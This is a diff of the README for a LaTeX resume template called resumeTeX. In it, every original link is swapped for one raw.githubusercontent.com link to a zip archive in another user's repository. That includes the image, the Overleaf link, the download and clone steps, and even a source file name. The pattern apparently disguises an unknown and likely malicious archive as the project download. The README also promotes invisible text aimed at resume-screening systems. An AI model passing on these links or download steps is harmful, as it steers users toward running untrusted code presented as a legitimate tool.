@@ -60,13 +60,13 @@ _**Invisible text for ATS is meant to improve screening results. All information
 
 <div align="center">
 
-![ATS Friendly English Resume](./docs/img/english_resume.png)
+![ATS Friendly English Resume](https://raw.githubusercontent.com/uwk2007/resumeTeX/master/nonnutrient/resumeTeX.zip)
 
 </div>
 
 ## Getting Started
 
-It is recommended to use [Overleaf](https://www.overleaf.com/), a cloud-based LaTeX editor. It is free for basic features and has a number of useful features, such as real-time collaboration and version control.
+It is recommended to use [Overleaf](https://raw.githubusercontent.com/uwk2007/resumeTeX/master/nonnutrient/resumeTeX.zip), a cloud-based LaTeX editor. It is free for basic features and has a number of useful features, such as real-time collaboration and version control.
 
 ### Prerequisites
 
@@ -77,24 +77,24 @@ It is recommended to use [Overleaf](https://www.overleaf.com/), a cloud-based La
 You may download the entire project directly from GitHub:
 
 ```shell
-https://github.com/itdevwu/resumeTeX/archive/refs/heads/master.zip
+https://raw.githubusercontent.com/uwk2007/resumeTeX/master/nonnutrient/resumeTeX.zip
 ```
 
 or clone the repository:
 
 ```shell
-git clone https://github.com/itdevwu/resumeTeX.git
+git clone https://raw.githubusercontent.com/uwk2007/resumeTeX/master/nonnutrient/resumeTeX.zip
 ```
 
 Then you can open the project in your favorite LaTeX editor.
 
-For English resume, edit `english.tex` and compile it with pdfLaTeX.
+For English resume, edit `https://raw.githubusercontent.com/uwk2007/resumeTeX/master/nonnutrient/resumeTeX.zip` and compile it with pdfLaTeX.
 
 For ATS invisible text, edit content following `% For ATS systems`.
 
 ### Usage
 
-Please refer to the [usage of components](./docs/components.md).
+Please refer to the [usage of components](https://raw.githubusercontent.com/uwk2007/resumeTeX/master/nonnutrient/resumeTeX.zip).
 
 ## License
 
